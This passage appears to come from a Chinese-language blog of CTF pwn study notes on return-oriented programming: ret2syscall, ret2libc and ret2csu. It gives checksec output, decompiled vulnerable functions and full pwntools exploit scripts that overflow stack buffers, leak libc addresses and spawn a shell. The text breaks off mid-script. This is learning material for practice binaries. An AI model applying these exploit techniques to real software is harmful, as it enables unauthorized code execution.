<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh = process(&#x27;./ret2syscall&#x27;)</span><br><span class="line"></span><br><span class="line">pop_eax_ret = 0x080bb196</span><br><span class="line">pop_edx_ecx_ebx_ret = 0x0806eb90</span><br><span class="line">int_0x80 = 0x08049421</span><br><span class="line">binsh = 0x80be408</span><br><span class="line">payload = &#x27;a&#x27;*112+p32(pop_eax_ret)+p32(0xb)+p32(pop_edx_ecx_ebx_ret)+p32(0)+p32(0)+p32(binsh)+p32(int_0x80)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>


<h4 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h4><h5 id="ret2libc1"><a href="#ret2libc1" class="headerlink" title="ret2libc1"></a>ret2libc1</h5><p>checksec:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
<p>ida:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">void secure()</span><br><span class="line">&#123;</span><br><span class="line">  unsigned int v0; // eax</span><br><span class="line">  int input; // [esp+18h] [ebp-10h] BYREF</span><br><span class="line">  int secretcode; // [esp+1Ch] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  v0 = time(0);</span><br><span class="line">  srand(v0);</span><br><span class="line">  secretcode = rand();</span><br><span class="line">  __isoc99_scanf(&quot;%d&quot;, &amp;input);</span><br><span class="line">  if ( input == secretcode )</span><br><span class="line">    system(&quot;shell!?&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>ropgadget查找&#x2F;bin&#x2F;sh;<br>exp:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">io=process(&quot;./ret2libc1&quot;)</span><br><span class="line">elf=ELF(&#x27;./ret2libc1&#x27;)</span><br><span class="line">system_plt=elf.plt[&#x27;system&#x27;]</span><br><span class="line">binsh=0x08048720</span><br><span class="line">payload=b&#x27;a&#x27;*(112)+p32(system_plt)+p32(0)+p32(binsh)</span><br><span class="line">io.recvline()</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h5 id="ret2libc2"><a href="#ret2libc2" class="headerlink" title="ret2libc2"></a>ret2libc2</h5><p>checksec:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
<p>ida:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  char s[100]; // [esp+1Ch] [ebp-64h] BYREF</span><br><span class="line"></span><br><span class="line">  setvbuf(stdout, 0, 2, 0);</span><br><span class="line">  setvbuf(_bss_start, 0, 1, 0);</span><br><span class="line">  puts(&quot;Something surprise here, but I don&#x27;t think it will work.&quot;);</span><br><span class="line">  printf(&quot;What do you think ?&quot;);</span><br><span class="line">  gets(s);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>因为没有‘&#x2F;bin&#x2F;sh’函数，又在bss段找到可写段，向buf2输入system,写入&#x2F;bin&#x2F;sh字符串。</p>
<p>exp:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">io=process(&#x27;./ret2libc2&#x27;)</span><br><span class="line">elf=ELF(&#x27;./ret2libc2&#x27;)</span><br><span class="line"></span><br><span class="line">system_plt=elf.plt[&#x27;system&#x27;]</span><br><span class="line">gets_plt=elf.plt[&#x27;gets&#x27;]</span><br><span class="line">buf2=0x0804A080</span><br><span class="line">pop_ebx=0x0804843d</span><br><span class="line"></span><br><span class="line">payload=b&#x27;a&#x27;*112+p32(gets_plt)+p32(pop_ebx)+p32(buf2)+p32(system_plt)+p32(0)+p32(buf2)</span><br><span class="line">io.recv()</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.sendline(b&#x27;/bin/sh&#x27;)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h5 id="ret2libc3"><a href="#ret2libc3" class="headerlink" title="ret2libc3"></a>ret2libc3</h5><p>checksec:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
<p>ida:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  char s[100]; // [esp+1Ch] [ebp-64h] BYREF</span><br><span class="line"></span><br><span class="line">  setvbuf(stdout, 0, 2, 0);</span><br><span class="line">  setvbuf(stdin, 0, 1, 0);</span><br><span class="line">  puts(&quot;No surprise anymore, system disappeard QQ.&quot;);</span><br><span class="line">  printf(&quot;Can you find it !?&quot;);</span><br><span class="line">  gets(s);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>exp:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">from LibcSearcher import*</span><br><span class="line">context(arch = &#x27;i386&#x27;,os = &#x27;linux&#x27;,log_level = &#x27;debug&#x27;)</span><br><span class="line"></span><br><span class="line">io=process(&#x27;./ret2libc3&#x27;)</span><br><span class="line">elf=ELF(&#x27;./ret2libc3&#x27;)</span><br><span class="line"></span><br><span class="line">puts_plt=elf.plt[&#x27;puts&#x27;]</span><br><span class="line">puts_got=elf.got[&#x27;puts&#x27;]</span><br><span class="line">pop_ebx=0x0804841d</span><br><span class="line">main_addr=elf.sym[&#x27;main&#x27;]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload=b&#x27;a&#x27;*112+p32(puts_plt)+p32(main_addr)+p32(puts_got)</span><br><span class="line">io.recv()</span><br><span class="line">io.sendline(payload)</span><br><span class="line">#print(hex(u32(io.recv()[0:4])))</span><br><span class="line">puts_addr=u32(io.recv(4))</span><br><span class="line">print(hex(puts_addr))</span><br><span class="line">#print(hex(u32(io.recv(4))))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">puts_offset=0x071910</span><br><span class="line">system_offset=0x049c10</span><br><span class="line">binsh_offset=0x1bbfef</span><br><span class="line"></span><br><span class="line">libc_base=puts_addr-puts_offset</span><br><span class="line">system=libc_base+system_offset</span><br><span class="line">binsh=libc_base+binsh_offset</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload=b&#x27;a&#x27;*104+p32(system)+p32(0xdeadbeef)+p32(binsh)</span><br><span class="line">io.recv()</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="中级rop"><a href="#中级rop" class="headerlink" title="中级rop"></a>中级rop</h3><h4 id="ret2csu"><a href="#ret2csu" class="headerlink" title="ret2csu"></a>ret2csu</h4><h5 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h5><p>rbx&#x3D;0 rbp&#x3D;1</p>
<h5 id="细节-1"><a href="#细节-1" class="headerlink" title="细节"></a>细节</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000004005C0 ; void _libc_csu_init(void)</span><br><span class="line">.text:00000000004005C0                 public __libc_csu_init</span><br><span class="line">.text:00000000004005C0 __libc_csu_init proc near               ; DATA XREF: _start+16o</span><br><span class="line">.text:00000000004005C0                 push    r15</span><br><span class="line">.text:00000000004005C2                 push    r14</span><br><span class="line">.text:00000000004005C4                 mov     r15d, edi</span><br><span class="line">.text:00000000004005C7                 push    r13</span><br><span class="line">.text:00000000004005C9                 push    r12</span><br><span class="line">.text:00000000004005CB                 lea     r12, __frame_dummy_init_array_entry</span><br><span class="line">.text:00000000004005D2                 push    rbp</span><br><span class="line">.text:00000000004005D3                 lea     rbp, __do_global_dtors_aux_fini_array_entry</span><br><span class="line">.text:00000000004005DA                 push    rbx</span><br><span class="line">.text:00000000004005DB                 mov     r14, rsi</span><br><span class="line">.text:00000000004005DE                 mov     r13, rdx</span><br><span class="line">.text:00000000004005E1                 sub     rbp, r12</span><br><span class="line">.text:00000000004005E4                 sub     rsp, 8</span><br><span class="line">.text:00000000004005E8                 sar     rbp, 3</span><br><span class="line">.text:00000000004005EC                 call    _init_proc</span><br><span class="line">.text:00000000004005F1                 test    rbp, rbp</span><br><span class="line">.text:00000000004005F4                 jz      short loc_400616</span><br><span class="line">.text:00000000004005F6                 xor     ebx, ebx</span><br><span class="line">.text:00000000004005F8                 nop     dword ptr [rax+rax+00000000h]</span><br><span class="line">.text:0000000000400600</span><br><span class="line">.text:0000000000400600 loc_400600:                             ; CODE XREF: __libc_csu_init+54j</span><br><span class="line">.text:0000000000400600                 mov     rdx, r13</span><br><span class="line">.text:0000000000400603                 mov     rsi, r14</span><br><span class="line">.text:0000000000400606                 mov     edi, r15d</span><br><span class="line">.text:0000000000400609                 call    qword ptr [r12+rbx*8]</span><br><span class="line">.text:000000000040060D                 add     rbx, 1</span><br><span class="line">.text:0000000000400611                 cmp     rbx, rbp</span><br><span class="line">.text:0000000000400614                 jnz     short loc_400600</span><br><span class="line">.text:0000000000400616</span><br><span class="line">.text:0000000000400616 loc_400616:                             ; CODE XREF: __libc_csu_init+34j</span><br><span class="line">.text:0000000000400616                 add     rsp, 8</span><br><span class="line">.text:000000000040061A                 pop     rbx</span><br><span class="line">.text:000000000040061B                 pop     rbp</span><br><span class="line">.text:000000000040061C                 pop     r12</span><br><span class="line">.text:000000000040061E                 pop     r13</span><br><span class="line">.text:0000000000400620                 pop     r14</span><br><span class="line">.text:0000000000400622                 pop     r15</span><br><span class="line">.text:0000000000400624                 retn</span><br><span class="line">.text:0000000000400624 __libc_csu_init endp</span><br></pre></td></tr></table></figure>
<p>这里我们可以利用以下几点</p>
<p>从 0x000000000040061A 一直到结尾，我们可以利用栈溢出构造栈上数据来控制 rbx,rbp,r12,r13,r14,r15 寄存器的数据。</p>
<p>从 0x0000000000400600 到 0x0000000000400609，我们可以将 r13 赋给 rdx, 将 r14 赋给 rsi，将 r15d 赋给 edi（需要注意的是，虽然这里赋给的是 edi，但其实此时 rdi 的高 32 位寄存器值为 0（自行调试），所以其实我们可以控制 rdi 寄存器的值，只不过只能控制低 32 位），而这三个寄存器，也是 x64 函数调用中传递的前三个寄存器。此外，如果我们可以合理地控制 r12 与 rbx，那么我们就可以调用我们想要调用的函数。比如说我们可以控制 rbx 为 0，r12 为存储我们想要调用的函数的地址。</p>
<p>从 0x000000000040060D 到 0x0000000000400614，我们可以控制 rbx 与 rbp 的之间的关系为 rbx+1 &#x3D; rbp，这样我们就不会执行 loc_400600，进而可以继续执行下面的汇编程序。这里我们可以简单的设置 rbx&#x3D;0，rbp&#x3D;1。</p>
<p>gadgets1</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000004011FE loc_4011FE:                             ; CODE XREF: __libc_csu_init+31↑j</span><br><span class="line">.text:00000000004011FE                 add     rsp, 8</span><br><span class="line">.text:0000000000401202                 pop     rbx</span><br><span class="line">.text:0000000000401203                 pop     rbp</span><br><span class="line">.text:0000000000401204                 pop     r12</span><br><span class="line">.text:0000000000401206                 pop     r13</span><br><span class="line">.text:0000000000401208                 pop     r14</span><br><span class="line">.text:000000000040120A                 pop     r15</span><br><span class="line">.text:000000000040120C                 retn</span><br><span class="line">.text:000000000040120C ; &#125; // starts at 4011B0</span><br></pre></td></tr></table></figure>
<p>这段代码可以将你构造的栈中的值一个一个顺序存到rbx,rbp,r12,r13,r14,r15寄存器中。</p>
<p>需要注意的是，可能随着环境的不同，r13,r14,r15的顺序也会有所改变。</p>
<p>gadgets2</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000004011E8 loc_4011E8:                             ; CODE XREF: __libc_csu_init+4C↓j</span><br><span class="line">.text:00000000004011E8                 mov     rdx, r15</span><br><span class="line">.text:00000000004011EB                 mov     rsi, r14</span><br><span class="line">.text:00000000004011EE                 mov     edi, r13d</span><br><span class="line">.text:00000000004011F1                 call    qword ptr [r12+rbx*8]</span><br><span class="line">.text:00000000004011F5                 add     rbx, 1</span><br><span class="line">.text:00000000004011F9                 cmp     rbp, rbx</span><br><span class="line">.text:00000000004011FC                 jnz     short loc_4011E8</span><br></pre></td></tr></table></figure>
<p>通过gadgets1中最后的ret，使程序流程走gadget2，这样可以将存储在r15的值赋给rdx，存储在r14的值赋给rsi，存储在r13的值赋给edi，此时rdi的高32位寄存器中值为0，所以我们也可以控制rdi的值。</p>
<p>call指令跳转到r12寄存器存储的位置处（在gadgets1中置rbx&#x3D;0）</p>
<p>rbx+1，判断是否与rbp相等，否则重新执行gadgets2，这里我们为了不重新执行，将rbp置为1.</p>
<p>这段gadgets2走完之后，顺序往下走汇编码，又会走到gadgets1，所以我们在栈中需要设7*8&#x3D;56个padding字符，使栈不会空，然后设置特定的ret地址。</p>
<p>重新走gadgets1时，会把rbx,rbp,r12,r13,r14,r15六个寄存器重新设值，但这六个<br>寄存器对我们来说已经没用了，所以可以为任意的padding。我们的目的仅仅是要控制rdi,rsi,rdx三个寄存器来存放函数的参数。</p>
<p>需要注意的是，rdi为第一个参数的存放寄存器，rsi为第二个参数，rdx为第三个参数。</p>
<h5 id="通用payload"><a href="#通用payload" class="headerlink" title="通用payload"></a>通用payload</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">def ret_csu(r12, r13, r14, r15, last):</span><br><span class="line">	payload = offset * b&#x27;a&#x27;  </span><br><span class="line">	#构造栈溢出的padding</span><br><span class="line">	payload += p64(first_csu) + b&#x27;a&#x27; * 8    </span><br><span class="line">	#gadgets1的地址</span><br><span class="line">	payload += p64(0) + p64(1)</span><br><span class="line">	#rbx=0, rbp=1</span><br><span class="line">	payload += p64(r12)</span><br><span class="line">	#call调用的地址</span><br><span class="line">	payload += p64(r13) + p64(r14) + p64(r15)</span><br><span class="line">	#三个参数的寄存器</span><br><span class="line">	payload += p64(second_csu)</span><br><span class="line">	#gadgets2的地址</span><br><span class="line">	payload += b&#x27;a&#x27; * 56</span><br><span class="line">	#pop出的padding</span><br><span class="line">	payload += p64(last)</span><br><span class="line">	#函数最后的返回地址</span><br><span class="line">	return payload</span><br></pre></td></tr></table></figure>
<p>call函数为跳转到某地址内所保存的地址，应该使用got表中的地址</p>
<p>ret指令必须跳转到一段有效的汇编指令，所以应为plt表中的地址</p>
<h5 id="easy-csu"><a href="#easy-csu" class="headerlink" title="easy_csu"></a>easy_csu</h5><p>checksec:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
<p>ida:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  char buf[32]; // [rsp+0h] [rbp-20h] BYREF</span><br><span class="line"></span><br><span class="line">  vul(0LL, 0LL, 0LL);</span><br><span class="line">  read(0, buf, 0x100uLL);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br><span class="line">__int64 __fastcall vul(__int64 a1, __int64 a2, int a3)</span><br><span class="line">&#123;</span><br><span class="line">  if ( a3 == 3 )</span><br><span class="line">    puts(&quot;Success!&quot;);</span><br><span class="line">  else</span><br><span class="line">    puts(&quot;Try or Retry your payload&quot;);</span><br><span class="line">  return 0LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>exp:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh = process(&quot;easy_csu&quot;)</span><br><span class="line">elf=ELF(&#x27;./easy_csu&#x27;)</span><br><span class="line">context.log_level = &quot;DEBUG&quot;</span><br><span class="line"></span><br><span class="line">gadget1 = 0x00000000004011FE</span><br><span class="line"></span><br><span class="line">gadget2 = 0x00000000004011E8</span><br><span class="line"></span><br><span class="line">put_addr = 0x0000000000404018</span><br><span class="line">libc_addr = 0x0000000000403ff0</span><br><span class="line"></span><br><span class="line">start_addr = 0x0000000000401050</span><br><span class="line"></span><br><span class="line">payload = (0x20 + 8) * b&#x27;a&#x27;</span><br><span class="line"></span><br><span class="line">payload += p64(gadget1)</span><br><span class="line"></span><br><span class="line">payload += b&#x27;a&#x27; * 8</span><br><span class="line"></span><br><span class="line">payload += p64(0)</span><br><span class="line"></span><br><span class="line">payload += p64(1)</span><br><span class="line"></span><br><span class="line">payload += p64(put_addr)</span><br><span class="line"></span><br><span class="line">payload += p64(libc_addr) + p64(libc_addr) + p64(libc_addr)</span><br><span class="line"></span><br><span class="line">payload += p64(gadget2)</span><br><span class="line"></span><br><span class="line">payload += b&#x27;a&#x27; * 56</span><br><span class="line"></span><br><span class="line">payload += p64(start_addr)</span><br><span class="line"></span><br><span class="line">sh.recv()</span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">real_addr = u64(sh.recv(8))</span><br><span class="line"></span><br><span class="line">real_addr -= 0x540a000000000000</span><br><span class="line"></span><br><span class="line">print (hex(real_addr))</span><br><span class="line"></span><br><span class="line">addr_base = real_addr - 0x020740</span><br><span class="line"></span><br><span class="line">system_addr = addr_base + 0x045390</span><br><span class="line"></span><br><span class="line">binsh_addr = addr_base + 0x18cd57</span><br><span class="line"></span><br><span class="line">pop_addr = 0x000000000040120b</span><br><span class="line"></span><br><span class="line">sh.recv()</span><br><span class="line"></span><br><span class="line">payload = (0x20 + 8) * b&#x27;a&#x27; + p64(pop_addr) + p64(binsh_addr) + p64(system_addr)</span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
<h5 id="ret2csu-1"><a href="#ret2csu-1" class="headerlink" title="ret2csu"></a>ret2csu</h5><p>checksec:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
<p>ida:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  write(1, &quot;Hello, World\n&quot;, 0xDuLL);</span><br><span class="line">  return vulnerable_function();</span><br><span class="line">&#125;</span><br><span class="line">ssize_t vulnerable_function()</span><br><span class="line">&#123;</span><br><span class="line">  char buf[128]; // [rsp+0h] [rbp-80h] BYREF</span><br><span class="line"></span><br><span class="line">  return read(0, buf, 0x200uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>构造三次栈溢出</p>
<p>第一次使用write函数泄露出write函数的真实地址</p>
<p>第二次使用read函数向bss段写入计算得出的system地址以及&#x2F;bin&#x2F;sh字符串</p>
<p>第三次调用system函数，拿到shell</p>
<p>需要注意的是，无法通过libc中&#x2F;bin&#x2F;sh字符串的地址拿到shell，可能我本机环境变量存在问题，会报如下错误。</p>
<p>exp:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line"></span><br><span class="line">io=process(&#x27;./ret2csu&#x27;)</span><br><span class="line">elf=ELF(&#x27;./ret2csu&#x27;)</span><br><span class="line"></span><br><span class="line">first_csu=0x400606</span><br><span class="line">second_csu=0x4005F0</span><br><span class="line">libc_addr=0x601050</span><br><span class="line">start_addr=0x400460</span><br><span class="line">write_got=elf.got[&#x27;write&#x27;]</span><br><span class="line">read_got=elf.got[&#x27;read&#x27;]</span><br><span class="line">bss_addr=0x601028</span><br><span class="line"></span><br><span class="line">offset=(0x80+8)</span><br><span class="line"></span><br><span class="line">def ret_csu(r12, r13, r14, r15, last):</span><br><span class="line">	payload = offset * b&#x27;a&#x27;  </span><br><span class="line">	#构造栈溢出的padding</span><br><span class="line">	payload += p64(first_csu) + b&#x27;a&#x27; * 8    </span><br><span class="line">	#gadgets1的地址</span><br><span class="line">	payload += p64(0) + p64(1)</span><br><span class="line">	#rbx=0, rbp=1</span><br><span class="line">	payload += p64(r12)</span><br><span class="line">	#call调用的地址</span><br><span class="line">	payload += p64(r13) + p64(r14) + p64(r15)</span><br><span class="line">	#三个参数的寄存器</span><br><span class="line">	payload += p64(second_csu)</span><br><span class="line">	#gadgets2的地址</span><br><span class="line">	payload += b&#x27;a&#x27; * 56</span><br><span class="line">	#pop出的padding</span><br><span class="line">	payload += p64(last)</span><br><span class="line">	